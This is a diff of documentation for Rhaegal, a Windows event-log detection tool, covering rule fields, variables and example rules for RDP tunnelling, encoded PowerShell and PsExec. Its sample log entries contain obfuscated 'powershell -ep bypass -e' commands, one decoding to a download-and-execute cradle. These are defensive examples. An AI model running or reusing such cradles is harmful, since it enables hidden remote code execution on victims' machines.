@@ -8,7 +8,7 @@ In this section we will learn how to create Rhaegal rule. There is two type of R
   * A private rule that select the EID `7045` with the service name contains remote execution service name such as `PSEXESVC` in the `system` log.
   * A public rule that trigger only if the above rule are triggered with in `X` milliseconds.
 
-You papabile can see the potential of using the private rule, However nothing perfect. The private rules takes considerably more time to process that the public rules, So I will recommend use private rule if you can not accomplish what you want with the public rules or you do not care about the time the rule takes :)
+You probable can see the potential of using the private rule, However nothing perfect. The private rules takes considerably more time to process that the public rules, So I will recommend to use private rule if you can not accomplish what you want with the public rules or you do not care about the time the rule takes :)
 
 
 
@@ -47,7 +47,61 @@ The rule consists of two main parts:
     * description: A text descripting what you trying to detect.
   * Channel: This field is required. This is the name of the log you what to search in. For this example I am looking for the EID `4624` which is in the `Security.evtx` log.
   * include: This field is a list of fidelis that will get searched on each record. Each field inside this field could be a single value or a list of values.
-  * exclude: This field is a list of fidelis that will get excluded from the search. Each field inside this field could be a single value or a list of values.
+  * exclude *(optional)* : This field is a list of fidelis that will get excluded from the search. Each field inside this field could be a single value or a list of values.
+  * modifiers *(optional)* : A list of logical and regex checks the event fields. The following is the supported modifiers:
+  
+    * logical operations (<,>,<=,>=) which will check the length of the field. For example `Data.ServiceName <= 6` will check the length of the field named `Data.ServiceName` if it is less than or equal to `6`
+    * regex check on the event field. For example `Data.ServiceName $rex ([a-zA-Z0-9]){10}` will check if the field `Data.ServiceName` is `10` characters in length and it only contains letters and numbers.
+  * returns *(optional)*: A list of fields to be returned if the rule got triggered. If this is not provided the raw event data will be returned.
+
+# Variables 
+
+Rhaegal support variables to be passes instead of constants. Variables starts with `$` and can be used on every field. Here is a list of variables:
+
+* `$IP` : This variable will be evaluated at runtime to the IPv4 of the machine including the loop back IP. If there is multiple IPs the rule will check all of them. For example here is a rule to detect RDP tunneling:
+
+  ```yaml
+  public RDP_over_Reverse_SSH_Tunnel_WFP 
+  {
+      metadata:
+        author: Samir Bousseaden
+        reference: https://twitter.com/SBousseaden/status/1096148422984384514
+        creationDate: 2019/02/16
+        score: 80
+        description: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389
+      Channel: Security
+      include:
+        EventID: '5156'
+        Data.SourcePort: '3389'
+        Data.DestinationAddress: $IP
+        Data.DestinationPort: '3389'
+        Data.SourceAddress: $IP
+  }
+  ```
+
+  As you can see instead of using the loop back address we used `$IP` to trigger for all IPs assigned to the endpoint.
+
+* `$<FIELD_NAME>` : In this type of variable you can reverence fields to be check on another field. For example here is the same rule as above but using this variable:
+
+  ```yaml
+  public RDP_over_Reverse_SSH_Tunnel_WFP 
+  {
+      metadata:
+        author: Samir Bousseaden
+        reference: https://twitter.com/SBousseaden/status/1096148422984384514
+        creationDate: 2019/02/16
+        score: 80
+        description: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389
+      Channel: Security
+      include:
+        EventID: '5156'
+        Data.SourcePort: '3389'
+        Data.DestinationPort: '3389'
+        Data.SourceAddress: $Data.DestinationAddress
+  }
+  ```
+
+* `$<ENV>` : This type of variables allow you to reverence an environment variable. For example if you want to reverence the `COMPUTERNAME` environment variable all you need to do is to prepend `$` to the environment variable name so it will look like this `$COMPUTERNAME`
 
 # How Rhaegal Extracts The Events Fields ?
 
@@ -86,24 +140,41 @@ Rhaegal parses all the data from the event. Here how you can reference a field:
 In this section we will be writing a Rhaegal public rule to detect PowerShell encoded command. The following is an example of malicious activities that was logged in the `Windows PowerShell` log file:
 
 ```xml
+<?xml version="1.0" encoding="utf-16"?>
 <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="PowerShell" /> 
-      <EventID Qualifiers="0">403</EventID> 
-      <Level>4</Level> 
-      <Task>4</Task> 
-      <Keywords>0x80000000000000</Keywords> 
-      <TimeCreated SystemTime="2019-10-25T20:26:35.737437000Z" /> 
-      <EventRecordID>353</EventRecordID> 
-      <Channel>Windows PowerShell</Channel> 
-      <Computer>LAB-PC</Computer> 
-      <Security /> 
-    </System>
-	<EventData>
- 	  	<Data>Stopped</Data> 
-      	<Data>Available</Data> 
-      	<Data>NewEngineState=Stopped PreviousEngineState=Available SequenceNumber=15 HostName=ConsoleHost HostVersion=5.1.18362.145 HostId=9acf0149-61aa-419e-9ac2-ef336a40a31a HostApplication=powershell -ep bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7AEkARQBYACAAJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMgA3AC4AMAAuADAALgAxADoAOAAwADAAMAAvAHMAIgApAA== EngineVersion=5.1.18362.145 RunspaceId=c5d60be5-441d-408a-9e17-36084284756d PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=</Data> 
-	</EventData>
+  <System>
+    <Provider Name="PowerShell" />
+    <EventID Qualifiers="0">600</EventID>
+    <Level>4</Level>
+    <Task>6</Task>
+    <Keywords>0x80000000000000</Keywords>
+    <TimeCreated SystemTime="2019-12-24T16:46:45.739578100Z" />
+    <EventRecordID>1337</EventRecordID>
+    <Channel>Windows PowerShell</Channel>
+    <Computer>LAB-PC</Computer>
+    <Security />
+  </System>
+  <EventData>
+    <Data>Registry</Data>
+    <Data>Started</Data>
+    <Data>	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17134.858
+	HostId=dcd11215-1a77-44eb-ab30-dc75f100db18
+	HostApplication=powershell -ep bypass -e SQBFAFgAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFMAVQBWAFkASQBDAGgAYgBVADMAbAB6AGQARwBWAHQATABsAFIAbABlAEgAUQB1AFIAVwA1AGoAYgAyAFIAcABiAG0AZABkAE8AagBwAFYAVgBFAFkANABMAGsAZABsAGQARgBOADAAYwBtAGwAdQBaAHkAaABiAFUAMwBsAHoAZABHAFYAdABMAGsATgB2AGIAbgBaAGwAYwBuAFIAZABPAGoAcABHAGMAbQA5AHQAUQBtAEYAegBaAFQAWQAwAFUAMwBSAHkAYQBXADUAbgBLAEMAZABUAFYAVgBaAFoAUwBVAE4AbwBZAGwAVQB6AGIASABwAGsAUgAxAFoAMABUAEcAeABTAGIARwBWAEkAVQBYAFYAUwBWAHoAVgBxAFkAagBKAFMAYwBHAEoAdABaAEcAUgBQAGEAbgBCAFcAVgBrAFYAWgBOAEUAeAByAFoARwB4AGsAUgBrADQAdwBZADIAMQBzAGQAVgBwADUAYQBHAEoAVgBNADIAeAA2AFoARQBkAFcAZABFAHgAcgBUAG4AWgBpAGIAbABwAHMAWQAyADUAUwBaAEUAOQBxAGMARQBkAGoAYgBUAGwAMABVAFcAMQBHAGUAbABwAFUAVwBUAEIAVgBNADEASgA1AFkAVgBjADEAYgBrAHQARABaAEYAUgBXAFYAbABwAGEAVQAxAFYATwBiADEAbABzAFYAWABwAGkAUwBIAEIAcgBVAGoARgBhAE0ARgBSAEgAZQBGAE4AaQBSADEAWgBKAFYAVgBoAFcAVQAxAFoANgBWAG4ARgBaAGEAawBwAFQAWQAwAGQASwBkAEYAcABIAFUAbABCAGgAYgBrAEoAWABWAG0AdABXAFcAawA1AEYAZQBIAEoAYQBSADMAaAByAFUAbQBzADAAZAAxAGsAeQBNAFgATgBrAFYAbgBBADEAWQBVAGQASwBWAGsAMAB5AGUARABaAGEAUgBXAFIAWABaAEUAVgA0AGMAbABSAHUAVwBtAGwAaQBiAEgAQgB6AFcAVABJADEAVQAxAHAARgBPAFgARgBqAFIAVwBSAHEAWQBsAFIAcwBNAEYAVgBYAE0AVQBkAGwAYgBIAEIAVgBWADEAUgBDAFYAawAwAHgAUwBqAFYAWgBWAG0ATQB4AFkAbQB0ADAAUgBGAHAARwBVAGwAZABXAGIASABCAGgAVgBUAEYAVwBUADIASQB4AGIASABOAFcAVwBIAEIAcABVADAAaABDAGMAbABWAHEAUgBtAEYATgBSAGwASgBJAFoAVQBaAE8AYQBWAEkAeABXAGsAcABXAFYAbQBoAFgAVgBUAEYAYQBOAGwAWgB1AFIAbABwAGgAYQAzAEIAVQBXAFQAQgBrAFMAMgBSAEcAYwBFAGgAVgBiAEUASgBvAFkAbQB0AEsAVwBGAFoAdABkAEYAZABYAGEAegBWAEcAWgBVAGgASwBZAFYASQB6AGEASABKAFYAYgBYAE0AdwBaAEQARgByAGUAVQAxAFkAVABtAHQAVwBiAGsARQB4AFcAVgBWAGsAUwAxAFoAcgBNAEgAbABsAFIARgBwAGgAVQBsAGQAUwBXAEYAcABGAFYAagBSAGoAYgBGAEoAMQBWADIAMQBzAGEAVwBKAEkAUQBuAHAAWABWAEUAawB4AFYAVABGAHcAUgBrADkAWQBSAG0AcABTAFYAMQBKAHgAVwBXAHgAUwBjADAAMQBHAFYAbABoAE4AVgBXAFIAcwBZAGsAaABDAFYAbABZAHgAVQBrAE4AVwBhAHoAQgA0AFUAMgBwAFcAVwBsAFoAdABUAFgAaABaAGIAWABRAHcAVQBrAFoAdwBSADEAVgBzAFoARgBkAGkAUwBFAEoAbwBWAGwAUgBHAFYAMQBRAHkAUwBYAGgAaQBTAEUANQBYAFYAMABoAEMAYwBGAFUAdwBhAEUATgBqAGIARgBaAHgAVQBtADEARwBUAGwASgBzAFMAawBsAGEAVgBWAHAAUABZAFYAWgBKAGUARgBkAHIAYwBGAGQAVwBiAFcAaABZAFYAbABSAEcAWQBVADUAcwBXAG4AVgBTAGIASABCAG8AWQBUAE4AQwBWAFYAZABVAFEAbQB0AFQATQBsAEoASABZADAAVgBvAFYAbQBKAEYAUwBtADkAWgBiAFgAUgBMAFYAMABaAGEAZABHAFIARwBaAEYAaABoAGUAbABaAEgAVwBsAFYAbwBTADEAbABXAFMAWABwAGgAUwBFAHAAVwBZAGwAaABOAGQAMQBwAEUAUgBuAEoAbABWAFQARgBaAFYARwAxADAAVgAyAEoAcgBSAFgAaABYAFYAbABaAHIAVQB6AEYAYQBjAGsAMQBJAGIARwB4AFMAUgBuAEIAbwBWAFcAeABrAFUAMQBkAEcAYwBFAFoAVwBhAGwASgBxAFkAawBaAEsATQBWAFkAeQBNAFgATgBoAFYAMABwAEoAVQBXADUAdwBXAEYAWgBGAGEAMwBoAFcAVgBFAFoAMwBVAG0AcwA1AFcAVgBKAHQAYwBGAE4AVwBNAFUAcAA0AFYAMQBkADQAVQAyAE0AdwBNAFUAZABXAGIARwBoAE8AVgBsAGQAUwBjADEAbAByAGEARQBOAFcAYgBGAGwANABWAFcAdABPAFYAMgBGADYAUQBqAFIAVgBNAG4AQgBYAFYAMgB4AGEAZABGAFIAWQBhAEYAcABpAFcARgBGADMAVgBXAHQAYQBkADEASQB4AGMARQBaAE8AVgBUAFYAVQBVAGwAVgBzAE4AbABaAHEAUwBqAEIAVwBNAGsAVgA0AFYAMgA1AFMAVgBtAEUAeQBVAGwAWgBaAFYARQBwAHYAVgBWAFoAWgBkADIARgBGAFQAbQBwAGkAUgBsAHAAVwBWAFYAZAAwAGEAMgBGAHMAUwBuAE4AVwBhAGwASgBYAFUAagBOAFMAVQBGAGwAWABjADMAaABqAGIARwBSAHoAWQBrAGQARwBVADEAWQB4AFIAWABkAFcAVgBFAG8AMABWAEQARgBPAFMARgBaAHIAVgBsAFIAaQBWAFYAcABVAFcAVwB4AGsAYgAxAFIARwBXAFgAbABqAFIAVwBSAHEAWQBsAFoAYQBlAGwAWQB5AE4AVgBkAGgAVgBrAGwANQBZAFUAWgBvAFkAVgBaADYAUgBYAHAAVQBWADMAaAByAFYAagBGAGsAZABFADkAVwBXAGsANQBTAFIAbABwAFkAVgAxAGQAMABWADEAWQB5AFIAbABaAE4AUwBHAFIAVQBZAFQATgBTAFYAMQBsAFgAZABFAHQAVQBSAGwASgBYAFYAMgA1AE8AVgAwADEAWQBRAGsAaABaAE0ARwBSAEgAVgBHADEASwBSADIATgBHAGMARgBkAFMAUgBWAHAAVQBWAFcAcABHAFQAMgBNAHgAVABsAGwAYQBSAG0AaABvAFkAawBaAHcAVwBsAGQAWABkAEYAWgBOAFYAawBwAEgAWQBUAE4AawBZAFYASgBZAFUAbgBKAFcAYgBYAGgAaABUAFUAWgB3AFYAbABwAEkAWgBHAGgAVwBiAEgAQgA2AFcAVwA1AHcAUwAxAGQASABSAFgAaABYAGIAawBwAFgAWQBXAHQAdwBSADEAcABFAFMAawB0AFMAYgBVAFoASABVAFcAeABvAFUAMgBKAEkAUQBrADEAVwBiAEYASgBEAFkAVABGAFYAZAAwADEAWQBUAG0AaABOAE0AbgBoAFAAVgBtAHQAVwBTADIATgBXAFYAbgBGAFIAYgBtAFIATwBVAG0AMQBTAFYAbABVAHkATQBUAEIAaABSAGwAcABWAFUAbQA1AG8AVgAxAFoANgBRAFgAaABYAFYAbABwAEwAVgAwAFoAVwBkAFYAZABzAGMARQA1AFMATQBVAHAAUgBWAGsAZAA0AFkAVgBJAHkAVQBsAGQAagBSAFcAaABxAFUAagBKADQAVwBGAFYAcQBUAG0ANQBOAFIAbABwAHgAVQAyAHAAUwBhAEUAMQBXAFIAagBOAFUAVgBsAFoAaABZAFYAWgBLAFcARwBGAEcAVwBsAHAAaQBXAEcAZwB6AFcAVABCAGEAYwAyAFIASABWAGsAWgBrAFIAMgB4AE8AVgBqAEYASwBWADEAWgByAFoARABSAFQATQBXAHgAVwBUAFYAaABLAGEAbABKAHQAZQBGAGgAWgBhADIAUgBUAFkAMgB4AHMAVgAxAFoAWQBhAEcAcABXAGIARgBvAHcAVgBHAHgAawBSADEAVQB4AFcAWABsAGgAUwBHAHgAWQBWAGsAVgBLAGMAbABaAFUAUgBrADkAVwBNAFYAcAAxAFYAVwAxADQAVQAwADAAdwBTAG4AWgBXAGIAWABoAFgAWgBEAEYARgBlAEYAZABzAFoARgBoAGkAUwBFAEoAUQBWAG0AMAAxAFEAMgBWAHMAVgBuAFIAbABSADAAWgBwAFUAbQB0AHcAVwBWAFoAWABlAEUAOQBXAE0AawBwAEkAVgBWAFIAQwBWAGsAMQBHAGMARgBkAGEAVgBWAHAAVABZADIAMQBPAFIAMQBKAHMAVwBrADUAaABlAGwAVgA2AFYAbABoAHcAUgAxAFEAeQBUAG4ATgBSAGIARgBKAGEAVABUAEIASwBUAFYAWgBVAFMAbgBwAFAAVgBYAEEAMQBZAFQATgBDAFQARgBWAFUATQBEAGwASwBlAFcAdAB3AFMAMQBFADkAUABTAGMAcABLAFMAawA9ACcAKQApACkA
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+  </EventData>
 </Event>
 ```
 
@@ -139,7 +210,7 @@ Let's break down the above rule:
 * The `channel` field contains the log file that this rule apples to.
 * The `include` field contains two entries, And they are as follows:
   * EventID: This is the text inside the `EventID` tag in the event above.
-  * Data2: This is the third (index start at, as it should be ...) child of the `EventData` tag which contains the detailed log information. Here I am searching for `-e` argument and `bypass` keyword (might give you false positive, depending on your environment) . The `*` is a wildcard match, which means any character.
+  * Data2: This is the third (index start at 0 , as it should be ...) child of the `EventData` tag which contains the detailed log information. Here I am searching for `-e` argument and `bypass` keyword (might give you false positive, depending on your environment) . The `*` is a wildcard match, which means any character.
 
 If you tried to execute Rhaegal with this rule on the `Windows PowerShell` using the command :
 
@@ -293,7 +364,7 @@ Let's test these rules using the command:
 The results for the above command is:
 
 ```
-"2019-10-26 02:18:21.391807","['9165', '8281']","DetectPsExec",50,"PsExec Execution Detected","N/A","","PRIVATE RULE"
+"2019-10-26 02:18:21.391807","['9165', '8281']","DetectPsExec",50,"PsExec Execution Detected","N/A","","<EVENTS_DATA>"
 ```
 
 Notice the second CSV field is `['9165', '8281']` which is a list of `EventRecordIDs` for the events that satisfy the rule.
